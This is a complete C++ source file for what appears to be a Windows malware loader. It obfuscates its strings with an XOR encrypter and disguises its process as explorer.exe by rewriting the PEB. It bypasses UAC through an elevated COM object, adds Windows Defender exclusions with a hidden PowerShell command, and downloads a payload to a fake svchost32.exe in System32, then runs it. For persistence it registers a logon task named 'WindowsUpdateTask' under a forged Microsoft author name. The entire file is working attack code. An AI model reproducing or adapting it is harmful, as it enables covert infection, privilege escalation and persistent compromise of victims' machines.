#include <windows.h>
#include <winnt.h>
#include <combaseapi.h>
#include <taskschd.h>
#include <type_traits>
#include <comutil.h>
#include <ntstatus.h>
#include <tchar.h>
#include <string>
#include <vector>

namespace skc {
	template<class _Ty>
	using clean_type = typename std::remove_const_t<std::remove_reference_t<_Ty>>;

	template <int _size, char _key1, char _key2, typename T>
	class skCrypter
	{
	public:
		__forceinline constexpr skCrypter(T* data)
		{
			crypt(data);
		}

		__forceinline T* get()
		{
			return _storage;
		}

		__forceinline int size()
		{
			return _size;
		}

		__forceinline  char key()
		{
			return _key1;
		}

		__forceinline  T* encrypt()
		{
			if (!isEncrypted())
				crypt(_storage);

			return _storage;
		}

		__forceinline  T* decrypt()
		{
			if (isEncrypted())
				crypt(_storage);

			return _storage;
		}

		__forceinline bool isEncrypted()
		{
			return _storage[_size - 1] != 0;
		}

		__forceinline void clear()
		{
			for (int i = 0; i < _size; i++)
			{
				_storage[i] = 0;
			}
		}

		__forceinline operator T* ()
		{
			decrypt();

			return _storage;
		}

	private:
		__forceinline constexpr void crypt(T* data)
		{
			for (int i = 0; i < _size; i++)
			{
				_storage[i] = data[i] ^ (_key1 + i % (1 + _key2));
			}
		}

		T _storage[_size]{};
	};
}

#define skCrypt(str) skCrypt_key(str, __TIME__[4], __TIME__[7])
#define skCrypt_key(str, key1, key2) []() { \
			constexpr static auto crypted = skc::skCrypter \
				<sizeof(str) / sizeof(str[0]), key1, key2, skc::clean_type<decltype(str[0])>>((skc::clean_type<decltype(str[0])>*)str); \
					return crypted; }()

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")

struct Config {
	std::wstring taskName;
	std::wstring authorName;
	std::wstring downloadUrl;
	std::wstring targetPath;
	std::wstring exclusionPath;
	std::wstring exclusionExtension;
	int downloadDelay;
	int executionDelay;
};

Config GetConfig() {
	Config cfg;
	cfg.taskName = skCrypt(L"WindowsUpdateTask");
	cfg.authorName = skCrypt(L"Microsoft Corporation");
	cfg.downloadUrl = skCrypt(L"https://example.com/payload.exe");
	cfg.targetPath = skCrypt(L"C:\\Windows\\System32\\svchost32.exe");
	cfg.exclusionPath = skCrypt(L"C:\\Windows\\System32\\");
	cfg.exclusionExtension = skCrypt(L"exe");
	cfg.downloadDelay = 12000;
	cfg.executionDelay = 1000;
	return cfg;
}

#define UCM_DEFINE_GUID(name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8) \
     EXTERN_C const GUID DECLSPEC_SELECTANY name \
                = { l, w1, w2, { b1, b2,  b3,  b4,  b5,  b6,  b7,  b8 } }  

UCM_DEFINE_GUID(IID_ICMUACUtil, 0x6EDD6D74, 0xC007, 0x4E75, 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C);

typedef interface ICMUACUtil ICMUACUtil;

typedef struct ICMUACUtilVtbl {
	BEGIN_INTERFACE

		HRESULT(STDMETHODCALLTYPE* QueryInterface)(__RPC__in ICMUACUtil* This, __RPC__in REFIID riid, _COM_Outptr_  void** ppvObject);

	ULONG(STDMETHODCALLTYPE* AddRef)(__RPC__in ICMUACUtil* This);

	ULONG(STDMETHODCALLTYPE* Release)(__RPC__in ICMUACUtil* This);

	HRESULT(STDMETHODCALLTYPE* SetRasCredentials)(__RPC__in ICMUACUtil* This);

	HRESULT(STDMETHODCALLTYPE* SetRasEntryProperties)(__RPC__in ICMUACUtil* This);

	HRESULT(STDMETHODCALLTYPE* DeleteRasEntry)(__RPC__in ICMUACUtil* This);

	HRESULT(STDMETHODCALLTYPE* LaunchInfSection)(__RPC__in ICMUACUtil* This);

	HRESULT(STDMETHODCALLTYPE* LaunchInfSectionEx)(__RPC__in ICMUACUtil* This);

	HRESULT(STDMETHODCALLTYPE* CreateLayerDirectory)(__RPC__in ICMUACUtil* This);

	HRESULT(STDMETHODCALLTYPE* ShellExec)(__RPC__in ICMUACUtil* This, _In_ LPCTSTR lpFile, _In_opt_ LPCTSTR lpParameters, _In_opt_ LPCTSTR lpDirectory, _In_ ULONG fMask, _In_ ULONG nShow);

	END_INTERFACE

} *PICMUACUtilVtbl;

interface ICMUACUtil { CONST_VTBL struct ICMUACUtilVtbl* lpVtbl; };

HRESULT ucmAllocateElevatedObject(_In_ LPWSTR lpObjectCLSID, _In_ REFIID riid, _In_ DWORD dwClassContext, _Outptr_ void** ppv) {
	BOOL        bCond = FALSE;
	DWORD       classContext;
	HRESULT     hr = E_FAIL;
	PVOID       ElevatedObject = NULL;

	BIND_OPTS3  bop;
	WCHAR       szMoniker[MAX_PATH];

	do {
		if (wcslen(lpObjectCLSID) > 64) break;

		RtlSecureZeroMemory(&bop, sizeof(bop));
		bop.cbStruct = sizeof(bop);

		classContext = dwClassContext;
		if (dwClassContext == 0) classContext = CLSCTX_LOCAL_SERVER;

		bop.dwClassContext = classContext;

		wcscpy_s(szMoniker, skCrypt(L"Elevation:Administrator!new:"));
		wcscat_s(szMoniker, lpObjectCLSID);

		hr = CoGetObject(szMoniker, (BIND_OPTS*)&bop, riid, &ElevatedObject);

	} while (bCond);

	*ppv = ElevatedObject;

	return hr;
}

BOOL MaskPEB() {
	typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR  Buffer; }
	UNICODE_STRING, * PUNICODE_STRING;

	typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
		HANDLE ProcessHandle,
		DWORD ProcessInformationClass,
		PVOID ProcessInformation,
		DWORD ProcessInformationLength,
		PDWORD ReturnLength
		);

	typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection)(PRTL_CRITICAL_SECTION CriticalSection);

	typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection)(PRTL_CRITICAL_SECTION CriticalSection);

	typedef void (WINAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);

	typedef struct _LIST_ENTRY {
		struct _LIST_ENTRY* Flink;
		struct _LIST_ENTRY* Blink;
	} LIST_ENTRY, * PLIST_ENTRY;

	typedef struct _PROCESS_BASIC_INFORMATION {
		LONG ExitStatus;
		PVOID PebBaseAddress;
		ULONG_PTR AffinityMask;
		LONG BasePriority;
		ULONG_PTR UniqueProcessId;
		ULONG_PTR ParentProcessId;
	} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

	typedef struct _PEB_LDR_DATA {
		ULONG Length;
		BOOLEAN Initialized;
		HANDLE SsHandle;
		LIST_ENTRY InLoadOrderModuleList;
		LIST_ENTRY InMemoryOrderModuleList;
		LIST_ENTRY InInitializationOrderModuleList;
		PVOID EntryInProgress;
		BOOLEAN ShutdownInProgress;
		HANDLE ShutdownThreadId;
	} PEB_LDR_DATA, * PPEB_LDR_DATA;

	typedef struct _RTL_USER_PROCESS_PARAMETERS {
		BYTE           Reserved1[16];
		PVOID          Reserved2[10];
		UNICODE_STRING ImagePathName;
		UNICODE_STRING CommandLine;
	} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

	typedef struct _PEB {
		BOOLEAN InheritedAddressSpace;
		BOOLEAN ReadImageFileExecOptions;
		BOOLEAN BeingDebugged;
		union {
			BOOLEAN BitField;
			struct {
				BOOLEAN ImageUsesLargePages : 1;
				BOOLEAN IsProtectedProcess : 1;
				BOOLEAN IsLegacyProcess : 1;
				BOOLEAN IsImageDynamicallyRelocated : 1;
				BOOLEAN SkipPatchingUser32Forwarders : 1;
				BOOLEAN SpareBits : 3;
			};
		};
		HANDLE Mutant;

		PVOID ImageBaseAddress;
		PPEB_LDR_DATA Ldr;
		PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
		PVOID SubSystemData;
		PVOID ProcessHeap;
		PRTL_CRITICAL_SECTION FastPebLock;
	} PEB, * PPEB;

	typedef struct _LDR_DATA_TABLE_ENTRY {
		LIST_ENTRY InLoadOrderLinks;
		LIST_ENTRY InMemoryOrderLinks;
		union {
			LIST_ENTRY InInitializationOrderLinks;
			LIST_ENTRY InProgressLinks;
		};
		PVOID DllBase;
		PVOID EntryPoint;
		ULONG SizeOfImage;
		UNICODE_STRING FullDllName;
		UNICODE_STRING BaseDllName;
		ULONG Flags;
		WORD LoadCount;
		WORD TlsIndex;
		union {
			LIST_ENTRY HashLinks;
			struct { PVOID SectionPointer; ULONG CheckSum; };
		};
		union {
			ULONG TimeDateStamp;
			PVOID LoadedImports;
		};
	} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

	DWORD dwPID;
	PROCESS_BASIC_INFORMATION pbi;
	PPEB peb;
	PPEB_LDR_DATA pld;
	PLDR_DATA_TABLE_ENTRY ldte;

	HMODULE hNtdll = GetModuleHandle(skCrypt(L"ntdll.dll"));

	_NtQueryInformationProcess NtQueryInformationProcess =
		(_NtQueryInformationProcess)GetProcAddress(hNtdll, skCrypt("NtQueryInformationProcess"));
	if (NtQueryInformationProcess == NULL) return FALSE;

	_RtlEnterCriticalSection RtlEnterCriticalSection =
		(_RtlEnterCriticalSection)GetProcAddress(hNtdll, skCrypt("RtlEnterCriticalSection"));
	if (RtlEnterCriticalSection == NULL) return FALSE;

	_RtlLeaveCriticalSection RtlLeaveCriticalSection =
		(_RtlLeaveCriticalSection)GetProcAddress(hNtdll, skCrypt("RtlLeaveCriticalSection"));
	if (RtlLeaveCriticalSection == NULL) return FALSE;

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(hNtdll, skCrypt("RtlInitUnicodeString"));
	if (RtlInitUnicodeString == NULL) return FALSE;

	dwPID = GetCurrentProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
	if (hProcess == INVALID_HANDLE_VALUE) return FALSE;

	NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) return FALSE;

	if (!ReadProcessMemory(hProcess, &peb->Ldr, &pld, sizeof(pld), NULL)) return FALSE;

	WCHAR chExplorer[MAX_PATH + 1];
	GetWindowsDirectory(chExplorer, MAX_PATH);
	wcscat_s(chExplorer, sizeof(chExplorer) / sizeof(wchar_t), skCrypt(L"\\explorer.exe"));

	LPWSTR pwExplorer = (LPWSTR)malloc(MAX_PATH);
	wcscpy_s(pwExplorer, MAX_PATH, chExplorer);

	RtlEnterCriticalSection(peb->FastPebLock);

	RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, pwExplorer);
	RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, pwExplorer);

	WCHAR wFullDllName[MAX_PATH];
	WCHAR wExeFileName[MAX_PATH];
	GetModuleFileName(NULL, wExeFileName, MAX_PATH);

	LPVOID pStartModuleInfo = peb->Ldr->InLoadOrderModuleList.Flink;
	LPVOID pNextModuleInfo = pld->InLoadOrderModuleList.Flink;
	do {
		if (!ReadProcessMemory(hProcess, &pNextModuleInfo, &ldte, sizeof(ldte), NULL)) return FALSE;

		if (!ReadProcessMemory(hProcess, (LPVOID)ldte->FullDllName.Buffer, (LPVOID)&wFullDllName, ldte->FullDllName.MaximumLength, NULL))
			return FALSE;

		if (_wcsicmp(wExeFileName, wFullDllName) == 0) {
			RtlInitUnicodeString(&ldte->FullDllName, pwExplorer);
			RtlInitUnicodeString(&ldte->BaseDllName, pwExplorer);
			break;
		}

		pNextModuleInfo = ldte->InLoadOrderLinks.Flink;

	} while (pNextModuleInfo != pStartModuleInfo);

	RtlLeaveCriticalSection(peb->FastPebLock);

	CloseHandle(hProcess);

	if (_wcsicmp(chExplorer, wFullDllName) == 0) return FALSE;

	return TRUE;
}

NTSTATUS UACShellExec(_In_ LPCTSTR lpszExecutable, LPCTSTR execParameters, ULONG nShow) {
	NTSTATUS         MethodResult = STATUS_ACCESS_DENIED;
	HRESULT          r = E_FAIL, hr_init;
	BOOL             bApprove = FALSE;
	ICMUACUtil* CMUACUtil = NULL;

	hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

	do {
		r = ucmAllocateElevatedObject(
			(LPWSTR)skCrypt(L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"),
			IID_ICMUACUtil,
			CLSCTX_LOCAL_SERVER,
			(void**)&CMUACUtil);

		if (r != S_OK) break;

		if (CMUACUtil == NULL) {
			r = E_OUTOFMEMORY;
			break;
		}

		r = CMUACUtil->lpVtbl->ShellExec(CMUACUtil,
			lpszExecutable,
			execParameters,
			NULL,
			SEE_MASK_DEFAULT,
			nShow);

		if (SUCCEEDED(r)) MethodResult = STATUS_SUCCESS;

	} while (FALSE);

	if (CMUACUtil != NULL) CMUACUtil->lpVtbl->Release(CMUACUtil);

	if (hr_init == S_OK) CoUninitialize();

	return MethodResult;
}

void CreatePersistenceTask(WCHAR *executablePath, const Config& cfg) {
	if (FAILED(CoInitializeEx(NULL, COINIT_MULTITHREADED)))
		return;
	
	if (FAILED(CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL))) {
		CoUninitialize();
		return;
	}

	ITaskService* pService = NULL;
	if (FAILED(CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService))) {
		CoUninitialize();
		return;
	}

	HRESULT hr = pService->Connect(_variant_t(), _variant_t(),_variant_t(), _variant_t());
	if (FAILED(hr)) {
		pService->Release();
		CoUninitialize();
		return;
	}

	ITaskFolder* pRootFolder = NULL;
	hr = pService->GetFolder(_bstr_t(skCrypt(L"\\")), &pRootFolder);
	if (FAILED(hr)) {
		pService->Release();
		CoUninitialize();
		return;
	}

	pRootFolder->DeleteTask(_bstr_t(cfg.taskName.c_str()), 0);

	ITaskDefinition* pTask = NULL;
	hr = pService->NewTask(0, &pTask);
	
	pService->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		CoUninitialize();
		return;
	}
	
	IRegistrationInfo* pRegInfo = NULL;
	hr = pTask->get_RegistrationInfo(&pRegInfo);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return;
	}

	IPrincipal *pTaskSecurity = NULL;
	hr = pTask->get_Principal(&pTaskSecurity);
	if (SUCCEEDED(hr))
		pTaskSecurity->put_RunLevel(TASK_RUNLEVEL_HIGHEST);

	hr = pRegInfo->put_Author(_bstr_t(cfg.authorName.c_str()));
	pRegInfo->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return;
	}

	ITaskSettings* pSettings = NULL;
	hr = pTask->get_Settings(&pSettings);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return;
	}

	hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
	if (FAILED(hr)) {
		pSettings->Release();
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return;
	}

	hr = pSettings->put_AllowHardTerminate(VARIANT_FALSE);
	if (FAILED(hr)) {
		pSettings->Release();
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return;
	}

	hr = pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
	if (FAILED(hr)) {
		pSettings->Release();
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return;
	}

	hr = pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
	pSettings->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return;
	}

	ITriggerCollection* pTriggerCollection = NULL;
	hr = pTask->get_Triggers(&pTriggerCollection);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return;
	}

	ITrigger* pTrigger = NULL;
	hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
	pTriggerCollection->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return;
	}

	ILogonTrigger* pLogonTrigger = NULL;
	hr = pTrigger->QueryInterface(IID_ILogonTrigger, (void**)&pLogonTrigger);
	pTrigger->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return;
	}

	hr = pLogonTrigger->put_Id(_bstr_t(skCrypt(L"Trigger1")));
	pLogonTrigger->Release();
	
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return;
	}

	IActionCollection* pActionCollection = NULL;
	
	hr = pTask->get_Actions(&pActionCollection);
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return;
	}

	IAction* pAction = NULL;
	
	hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	pActionCollection->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return;
	}

	IExecAction* pExecAction = NULL;
	hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
	pAction->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return;
	}

	hr = pExecAction->put_Path(_bstr_t(executablePath));
	pExecAction->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		pTask->Release();
		CoUninitialize();
		return;
	}
	
	IRegisteredTask* pRegisteredTask = NULL;
	pRootFolder->RegisterTaskDefinition(
		_bstr_t(cfg.taskName.c_str()),
		pTask,
		TASK_CREATE_OR_UPDATE,
		_variant_t(skCrypt(L"S-1-5-32-544")),
		_variant_t(),
		TASK_LOGON_GROUP,
		_variant_t(skCrypt(L"")),
		&pRegisteredTask);

	pRootFolder->Release();
	pTask->Release();
	pRegisteredTask->Release();
	CoUninitialize();
}

void ExecutePayload(const Config& cfg) {
	if (!MaskPEB()) return;

	auto sAddMpPreference = skCrypt(L"Add-MpPreference -ExclusionExtension '");
	auto sExclusionPath = skCrypt(L"' -ExclusionPath '");
	auto sEndQuote = skCrypt(L"'");
	
	std::wstring exclusionCmd = std::wstring(sAddMpPreference.decrypt()) + cfg.exclusionExtension + std::wstring(sExclusionPath.decrypt()) + cfg.exclusionPath + std::wstring(sEndQuote.decrypt());
	UACShellExec(skCrypt(L"powershell"), exclusionCmd.c_str(), SW_HIDE);
	Sleep(cfg.executionDelay);

	auto sProgressPref = skCrypt(L"$ProgressPreference = 'SilentlyContinue' ; Invoke-WebRequest \"");
	auto sOutFile = skCrypt(L"\" -OutFile '");
	
	std::wstring downloadCmd = std::wstring(sProgressPref.decrypt()) + cfg.downloadUrl + std::wstring(sOutFile.decrypt()) + cfg.targetPath + std::wstring(sEndQuote.decrypt());
	UACShellExec(skCrypt(L"powershell"), downloadCmd.c_str(), SW_HIDE);
	Sleep(cfg.downloadDelay);

	auto sAmpersand = skCrypt(L"& '");
	std::wstring executeCmd = std::wstring(sAmpersand.decrypt()) + cfg.targetPath + std::wstring(sEndQuote.decrypt());
	UACShellExec(skCrypt(L"powershell"), executeCmd.c_str(), SW_HIDE);
}

BOOL CheckElevation() {
	HANDLE token = NULL;
	TOKEN_ELEVATION elevation;
	DWORD size;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
		return FALSE;

	if (!GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
		CloseHandle(token);
		return FALSE;
	}

	CloseHandle(token);
	return elevation.TokenIsElevated;
}

void ElevateProcess(WCHAR* executablePath) {
	if (!MaskPEB()) return;

	auto sAmpersand = skCrypt(L"& '");
	auto sEndQuote = skCrypt(L"'");
	
	TCHAR command[265];
	wcscpy_s(command, 265, sAmpersand.decrypt());
	_tcscat_s(command, 265, executablePath);
	_tcscat_s(command, 265, sEndQuote.decrypt());
	UACShellExec(skCrypt(L"powershell"), command, SW_HIDE);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow) {
	WCHAR executablePath[260];
	RtlSecureZeroMemory(executablePath, sizeof(executablePath));
	GetModuleFileName(nullptr, executablePath, 260);

	Config cfg = GetConfig();

	if (!CheckElevation()) {
		ElevateProcess(executablePath);
		return 0;
	}

	CreatePersistenceTask(executablePath, cfg);
	ExecutePayload(cfg);

	return 0;
}
